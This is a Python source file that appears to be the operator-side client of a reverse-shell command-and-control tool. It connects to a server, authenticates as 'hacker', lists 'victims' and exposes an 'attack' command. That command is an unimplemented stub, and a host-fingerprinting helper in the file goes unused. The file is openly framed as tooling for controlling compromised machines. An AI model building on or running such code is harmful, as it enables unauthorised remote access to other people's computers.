import socket
import reverse_shell.consts as ct
import reverse_shell.utils as ut
import platform
import json
from sys import exit
from reverse_shell.hacker import cli


def initiate():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    addr = ('localhost', ct.SERVER_PORT)
    sock.connect(addr)
    return sock


def send_computer_info(sock):
    my_system = platform.uname()
    os = my_system.system
    arch = my_system.machine
    computer_info = json.dumps({"os": os, "arch": arch, "name": my_system.node})  # Sterialize the computer info
    ut.send_message(computer_info, sock)


def send_verification(sock):
    ut.send_message("hacker", sock)
    verification_message = ut.recieve_message(sock)

    if verification_message == ct.UNVERIFIED_MESSAGE:
        ut.log("error", "Verification failed! exiting...")
        exit(1)

    else:
        ut.log("success", "Vertification Succeeded!")


def attack(victim_id, sock):
    pass


def list_victims(sock):
    # Tell the server we're gonne need the online hackers
    try:
        ut.send_message("get_victims", sock)

        victims = ut.recieve_message(sock)
        if victims is not None:
            victims = json.loads(victims)

        print(victims)
    except BrokenPipeError:
        # May be some kind of connection error might happes so
        # we need to notify the hacker
        ut.log("error", "connection with the server has been lost!")


def start():
    try:
        sock = initiate()
    except IOError:
        print("IOerror occured, Server might be offline")
        exit(1)

    # Verifiying the client
    send_verification(sock)

    commands_with_funcs = {
        "attack": (attack, 1, [sock]),
        "list-victims": (list_victims, 0, [sock])
    }

    connected = True

    while connected:
        cli.initiate(additional_commands=commands_with_funcs)

    ut.log("disconnected", "Disconnected with the server.")


if __name__ == "__main__":
    start()
